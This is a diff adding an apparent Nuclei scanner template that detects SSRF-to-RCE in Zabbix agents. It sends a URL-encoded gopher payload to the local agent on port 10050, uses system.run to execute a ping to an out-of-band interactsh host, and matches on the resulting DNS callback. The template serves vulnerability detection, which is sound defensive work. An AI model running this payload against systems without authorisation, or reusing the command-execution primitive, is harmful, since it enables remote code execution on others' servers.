@@ -1,0 +1,18 @@
+id: gopher-zabbix-rce
+info:
+  name: Zabbix Agent SSRF to RCE via Gopher
+  author: jakelo-ai
+  severity: critical
+  description: Exploit SSRF to execute system commands via local Zabbix agent (port 10050).
+  tags: ssrf,gopher,zabbix,rce,oast,custom
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=gopher://127.0.0.1:10050/_system.run%5B%28ping%20-c%201%20{{interactsh-url}}%29%3Bsleep%202s%5D"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
